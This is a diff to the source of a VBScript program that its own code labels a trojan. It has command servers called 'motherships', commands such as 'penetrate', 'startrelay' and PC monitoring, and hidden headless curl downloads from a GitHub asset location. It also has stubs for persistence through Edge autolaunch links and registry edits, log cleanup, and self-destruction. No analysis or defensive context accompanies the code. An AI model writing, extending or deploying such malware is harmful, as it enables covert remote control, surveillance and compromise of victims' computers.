@@ -157,6 +157,7 @@ Function GetProcessName(pid)
     
 End Function
 
+' TODO
 Function GetProcessList()
     Call LogMsg("GetProcessList")
     
@@ -240,6 +241,10 @@ Function HeadersToDict(responsetext)
 
 End Function
 
+Function UploadResult(remotepath, localfpath)
+    '
+End Function
+
 Function RetrieveAsset(fname, localfpath)
     Dim pp : pp = "RetrieveAsset"
     
@@ -257,11 +262,6 @@ Function RetrieveAsset(fname, localfpath)
         
         Dim cmdstr
         cmdstr = "conhost.exe --headless cmd /c curl -kso " & localpath & " -G " & dq & url & dq 
-        
-        If not XIsEmpty(bunnyheader) Then
-            cmdstr = cmdstr & " -H " & dq & bunnyheader & dq
-        End If
-        
         RetrieveAsset = RunShell(cmdstr, True)
     End If
     
@@ -1107,7 +1107,6 @@ Dim mothership : mothership = mothershiplist(selectedmothershipindex)
 
 Dim mothershipassets : mothershipassets = "https://raw.githubusercontent.com/owd842/mothershipassets/master/"
 
-
 Dim cmdslist : cmdslist = Array("ping", "cmdlist", "watchdog", "retrieve", "penetrate", "reschedule", "startrelay", "startpcmon")
 
 Dim cmdname : cmdname = ""
@@ -1382,8 +1381,6 @@ Function ParseConfig(configstr)
             
                 if kkey = "mothershipassets" then
                     mothershipassets = value
-                elseif kkey = "bunnyheader" then
-                    bunnyheader = value
                 elseif kkey = "tplmothership" then
                     Call AddToArray(tplmothershiplist, value)
                 elseif kkey = "phpmothership" then
@@ -1405,7 +1402,6 @@ Function WriteConfig()
 	Dim configstr : configstr = ""
 	
 	configstr = "mothershipassets=" & mothershipassets & vbCrLf
-	configstr = configstr & "bunnyheader=" & bunnyheader & vbCrLf
 
 	Dim titem
 	For Each titem In tplmothershiplist
@@ -1494,24 +1490,6 @@ Function Watchdog()
 
     Loop
     
-End Function
-
-Function GetBunnyHeaderDict()
-    set GetBunnyHeaderDict = nothing
-    
-    Dim parts
-    
-    if not XIsEmpty(bunnyheader) Then
-        parts = Split(bunnyheader, ":")
-        
-        if IsArray(parts) then  
-            if UBound(parts) >= 1 Then
-                Set GetBunnyHeaderDict = CreateObject("Scripting.Dictionary")
-                GetBunnyHeaderDict.Add parts(0), trim(parts(1))
-            end if
-        end if
-    end if
-
 End Function
 
 ' TODO: add assets to list
@@ -1892,6 +1870,7 @@ Function ActivatePythonScript(scriptdir, scriptfname, scriptname)
     
 End Function
 
+' TODO -- cmd for EXEC_CMD
 Function StartPSPCMon()
     Err.Clear
     
@@ -1937,6 +1916,7 @@ Function StartPSPCMon()
     
 End Function
 
+' TODO -- cmd for EXEC_CMD
 Function StartPCMon()
     cmdname = "startpcmon"
 
@@ -1995,6 +1975,7 @@ Function StartPCMon()
     
 End Function
 
+' TODO -- cmd for EXEC_CMD
 Function StartRelay()
     cmdname = "startrelay"
 
@@ -2056,12 +2037,15 @@ Function StartRelay()
     
 End Function
 
+' TODO -- cmd for EXEC_CMD
 Function StopRelay()
 End Function
 
+' TODO -- cmd for EXEC_CMD
 Function StopPSPCMon()
 End Function
 
+' TODO -- cmd for EXEC_CMD
 Function StopPCMon()
     Call LogMsg("StopPCMon -- starting")
     
@@ -2911,12 +2895,17 @@ Function ExecCmd(tcmdname, args)
     ExecCmd = pid
 End Function
 
-Function ActivateCmd(tcmdname)       
+Function ActivateCmd(tcmdname)
+    Err.Clear
+    Dim pp : pp = "ActivateCmd"
+    
     ActivateCmd = -1
 
     If XIsEmpty(tcmdname) Then
         Exit Function
     End If
+    
+    Call LogMsg(pp & " -- starting")
 
     Call LogMsg("ActivateCmd: cmdname=" & tcmdname)
 
@@ -2939,6 +2928,13 @@ Function ActivateCmd(tcmdname)
 
     Call LogMsg("ActivateCmd: pid=" & CStr(ActivateCmd))
     
+    If Err.Number <> 0 then
+        Call LogMsg(pp & " -- reporting errors")
+        Call LogErr()
+        Exit Function
+    End IF
+    
+    Call LogMsg(pp & " -- finished")
 End Function
 
 Function Activate()
@@ -3191,22 +3187,54 @@ Function WriteTaskXML(fname, xmlstr)
     End If
 End Function
 
+' TODO -- cmd for EXEC_CMD
 Function InstallPython()
-    ' download parts from mothershipassets (need bunnyheader) location
-    ' download each part, check size
-    ' check zip MD5
+    ' download parts from mothershipassets
+    ' unite, unzip
 End Function
 
+' TODO -- cmd for EXEC_CMD
 Function ModifyMSEdgeLnk()
     ' MicrosoftEdgeAutoLaunch_5B148DE90C207DD5EDAA5B34E614DD84
     ' all lnk locations
     ' registry edit
 End Function
 
+' TODO -- cmd for EXEC_CMD
+Function GetProcList()
+    Dim pp : pp = "GetProcList"
+    
+    cmdname = LCase(pp)
+
+
+    Err.Clear
+    
+    Call LogMsg(pp & " -- starting")
+    
+    ' anchor
+    Dim proclist : proclist = GetProcessList()
+    
+    If Not IsDict(proclist) then
+        Call LogMsg(pp & " proclist is not a valid dict -- exiting")
+        exit function
+    End if
+    
+    If Err.Number <> 0 then
+        Call LogMsg(pp & " -- reporting errors")
+        Call LogErr()
+        Exit Function
+    End IF
+    
+    Call LogMsg(pp & " -- finished")
+    
+End Function
+
+' TODO -- cmd for EXEC_CMD
 Function SelfDestruct()
 ' delete all regs, startup path, and trojandir, etc.
 End Function
 
+' TODO -- cmd for EXEC_CMD
 Function GetSystemOverview()
     ' see if pcmon installed, python installed
     ' cdptest
@@ -3220,10 +3248,12 @@ Function GetSystemOverview()
 
 End Function
 
+' TODO -- cmd for EXEC_CMD
 Function Cleanup()
     ' remove log files, cmd_list run directories
 End Function
 
+' TODO -- cmd for EXEC_CMD
 Function GetTasks()
     
     ' run schtasks
